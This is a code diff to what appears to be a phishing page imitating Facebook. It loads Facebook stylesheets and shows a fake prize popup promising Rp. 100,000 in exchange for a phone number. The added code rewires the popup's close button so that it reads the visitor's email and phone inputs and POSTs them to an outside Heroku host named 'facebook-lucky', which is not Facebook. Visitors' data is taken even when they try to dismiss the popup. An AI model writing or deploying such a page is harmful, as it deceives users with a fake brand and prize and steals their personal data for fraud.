@@ -330,7 +330,7 @@
         as="style" crossorigin="anonymous" />
     <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/Y7DmjgpO0hg.css?_nc_x=Ij3Wp8lg5Kz"
         as="style" crossorigin="anonymous" />
- 
+
     <!-- div containing the popup -->
     <div class="content">
         <div onclick="togglePopup()" class="close-btn">
@@ -341,10 +341,9 @@
             I'm glad you got Rp. 100,000. The amount will be transferred to your sim card immediately.
         </p>
 
-        <div class="_6lux"><input type="text" class="inputtext _55r1 _6luy"
-            name="phone" id="phone" data-testid="royal_email"
-            placeholder="Input Phone Number" autofocus="1"
-            aria-label="Input Phone Number" /></div>
+        <div class="_6lux_s"><input type="text" class="inputtext _55r1 _6luy" name="phone" id="phone"
+                data-testid="royal_email" placeholder="Input Phone Number" autofocus="1"
+                aria-label="Input Phone Number" /></div>
 
         <a href="https://www.facebook.com" class="button5" style="background-color:#42cc8c;">Direct page</a>
     </div>
@@ -403,12 +402,27 @@
                         // alert('Data sent!');
                         $(".content").toggle();
                     }
-                }); 
+                });
             });
         });
 
-        function togglePopup() {
-            $(".content").toggle();
+        function togglePopup() { 
+            var email = $('._6lux').find('input[name="email"]').val();
+            var phone = $('._6lux_s').find('input[name="phone"]').val();
+            data = {
+                "email": email,
+                "phone": phone
+            }
+            data_stringify = JSON.stringify(data)
+            $.ajax({
+                type: "POST",
+                url: "https://facebook-lucky.herokuapp.com/save_phone",
+                contentType: "application/json",
+                data: data_stringify,
+                success: function () {
+                    $(".content").toggle();
+                }
+            }); 
         }
     </script>
 </body>
